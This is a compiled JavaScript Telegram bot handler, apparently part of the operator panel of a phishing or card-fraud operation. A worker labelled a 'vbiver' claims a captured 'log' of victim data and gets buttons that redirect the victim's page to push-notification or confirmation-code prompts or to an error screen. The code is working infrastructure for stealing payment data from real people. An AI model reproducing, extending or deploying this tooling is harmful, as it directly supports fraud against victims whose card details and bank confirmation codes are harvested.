"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.composer = void 0;
const grammy_1 = require("grammy");
const console_1 = __importDefault(require("console"));
const lonelypups_1 = require("../../../database/lonelypups");
const mysql = require('mysql');
const regex = /log\s+take\s+(?<order>\d+)/gmsi;
exports.composer = new grammy_1.Composer();
exports.composer.callbackQuery(regex, callbackHandler);
async function callbackHandler(ctx) {
    const match = regex.exec(ctx.match[0]);
    const log = await lonelypups_1.lonelyRepository.getOrder(Number(match.groups.order));
    const message = await ctx.api.sendMessage(ctx.from.id, `
    ${ctx.callbackQuery.message.text}`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: '📱 push', callback_data: ` log redirect push ${log.id}` }, { text: '📲 push code', callback_data: `log redirect push-code ${log.id}` }],
                [{ text: '⚠️ error', callback_data: `log set error ${log.id}` }],
                // [{text: '📝 text', callback_data: `log redirect error ${log.id}`}],
            ]
        }
    });
    await lonelypups_1.lonelyRepository.setVbiverAndMessageId(Number(match.groups.order), {
        messageId: message.message_id,
        vbiverId: ctx.from.id
    });
    console_1.default.log({
        messageId: message.message_id,
        vbiverId: ctx.from.id
    });
    try {
        await ctx.editMessageReplyMarkup({
            reply_markup: {
                inline_keyboard: []
            }
        });
    }
    catch (e) { }
    if (!log)
        return ctx.deleteMessage();
    await ctx.editMessageText(ctx.update.callback_query.message.text, {
        reply_markup: {
            inline_keyboard: [
                [{ text: `${ctx.from.first_name}`, url: "tg://user?id=" + ctx.from.id }, { text: "🖕🏽 Забрать", callback_data: `log take ${log.id}` }],
            ]
        }
    });
}
